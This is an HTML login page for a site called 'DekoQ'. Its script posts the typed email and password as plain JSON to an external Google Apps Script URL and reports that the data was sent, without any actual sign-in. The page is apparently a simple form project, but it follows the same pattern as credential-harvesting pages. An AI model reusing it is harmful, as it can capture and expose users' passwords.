<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }

    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      display: block;
      text-align: left;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      max-width: 100%;
      font-size: 1rem;
      padding: 0.8rem 2.5rem 0.8rem 1.2rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 1rem;
    }

    .password-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }

    .password-wrapper svg {
      position: absolute;
      right: 12px;
      width: 24px;
      height: 24px;
      cursor: pointer;
      fill: #888;
    }

    button[type="submit"] {
      width: 100%;
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 8px;
      margin-top: 0.5rem;
    }

    button:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="password-wrapper">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <svg id="toggleEye" onclick="togglePassword()" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M12 4.5C7.305 4.5 3.223 7.346 1.5 12c1.723 4.654 5.805 7.5 10.5 7.5s8.777-2.846 10.5-7.5C20.777 7.346 16.695 4.5 12 4.5zm0 12c-2.48 0-4.5-2.02-4.5-4.5S9.52 7.5 12 7.5s4.5 2.02 4.5 4.5-2.02 4.5-4.5 4.5zm0-7.5a3 3 0 100 6 3 3 0 000-6z"/>
          </svg>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
      .then(async response => {
        const text = await response.text();
        console.log("Raw response text:", text);
        if (response.ok) {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        } else {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        }
      })
      .catch(error => {
        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        console.error("Fetch Error!", error);
      });
    });

    let visible = false;
    function togglePassword() {
      const pwd = document.getElementById("password");
      const icon = document.getElementById("toggleEye");
      visible = !visible;
      pwd.type = visible ? "text" : "password";
      icon.innerHTML = visible
        ? '<path d="M12 4.5c-4.695 0-8.777 2.846-10.5 7.5 1.142 3.088 3.805 5.417 7.057 6.656l1.294-1.533a5.5 5.5 0 003.056 0l1.294 1.533c3.252-1.239 5.915-3.568 7.057-6.656-1.723-4.654-5.805-7.5-10.5-7.5z"/>'
        : '<path d="M12 4.5C7.305 4.5 3.223 7.346 1.5 12c1.723 4.654 5.805 7.5 10.5 7.5s8.777-2.846 10.5-7.5C20.777 7.346 16.695 4.5 12 4.5zm0 12c-2.48 0-4.5-2.02-4.5-4.5S9.52 7.5 12 7.5s4.5 2.02 4.5 4.5-2.02 4.5-4.5 4.5zm0-7.5a3 3 0 100 6 3 3 0 000-6z"/>';
    }
  </script>
</body>
</html>
